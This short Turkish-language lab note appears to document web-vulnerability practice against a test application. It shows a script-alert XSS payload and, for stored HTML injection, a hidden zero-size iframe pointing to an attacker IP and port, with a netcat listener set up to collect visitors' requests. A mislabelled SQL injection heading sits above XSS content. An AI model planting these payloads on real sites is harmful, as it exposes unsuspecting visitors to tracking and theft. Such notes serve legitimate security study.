SQL İNJECTİON - REFLECTED (GET)




![photo_6023604428080265317](https://user-images.githubusercontent.com/110966683/183882924-70f82c7d-2eda-466c-9db7-4680c145040d.jpeg)

































alert scripti deneyelim şimdi ekrana 1 yazdırması lazım

<h1>Hello,<script>alert(1)</script>!</h1>

HTML İNJECTİON - STORED (BLOG)
eğer bir stored açığı olursa burda çalıştırdığımız bir kod web sitesine giren herkesi etkiler farklı bilgisayrdan bu web sitesine girseniz bile hackerin çalıştırdığı kod çalışacaktır.
örnek olarak alert scripti çalıştırırsak giren her kullanıcı bu alerti görür
alert scripti: <h1>Hello,<script>alert(1)</script>!</h1>
peki daha teklikeli olarak ne yapılabilir;
<iframe src="http://192.168.245.148:4545/test" height="0"  width="0"></iframe>
bu komut sayesinde siteye giren kullanıcıların bilgileri bilgisayarımıza gelir
dinlemek için linux terminalimizde natcat kullanacağız 
linux natcat komutu: nc -nvlp 4545 dinlemek için 

